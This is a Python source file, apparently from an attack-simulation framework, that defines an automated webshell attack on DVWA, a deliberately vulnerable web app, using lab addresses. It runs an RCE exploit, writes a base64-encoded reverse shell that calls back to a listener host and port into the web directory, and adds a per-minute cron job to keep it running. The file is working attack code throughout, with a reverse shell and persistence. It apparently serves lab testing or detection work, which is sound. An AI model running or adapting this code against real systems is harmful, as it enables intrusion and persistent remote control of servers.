import base64

from attacks import AttackInfo
from attacks.exp_attack_options import RCEEXPAttackOptions, RCEEXPAttack


class DVWAWebshellAttackOptions(RCEEXPAttackOptions):
    webdir: str = "Web Directory to upload file"

    def _set_defaults(self) -> None:
        super()._set_defaults()
        self.url = "http://172.18.0.2/dvwa/"
        self.exp = "/root/dvwa-webshell.py"
        self.lhost = "172.18.0.3"
        self.lport = "4444"
        self.webdir = "/var/www/html"


class DVWAWebshellAttack(RCEEXPAttack):
    info: AttackInfo = AttackInfo(
        name="exp_dvwa_webshell",
        description="upload webshell using dvwa rce vulnerability",
    )
    options_class = DVWAWebshellAttackOptions

    def _exp(self):
        return f"python3 {self.options.exp} {self.options.url}"

    def run(self) -> None:
        self.connect_to_target()
        target_file = f"{self.options.webdir}/dvwa.sh"
        with self.check_printed(f"/bin/bash {target_file}"):
            with self.wrap_ssh_exceptions():
                self.exec_commands_on_shell(self.commands)

    def _append_command(self):
        target_file = f"{self.options.webdir}/dvwa.sh"
        base64_reverse_shell = self._generate_base64_reverse_shell()
        cron_command = self._add_cron_task(f"* * * * * /bin/bash {target_file}")
        self.commands.extend([
            self._exp(),   # get interactive shell
            "id",
            "ip addr",
            f"echo {base64_reverse_shell}|base64 -d > {target_file}",
            f"chmod +x {target_file}",
            f"{cron_command}",
            "crontab -l"
        ])
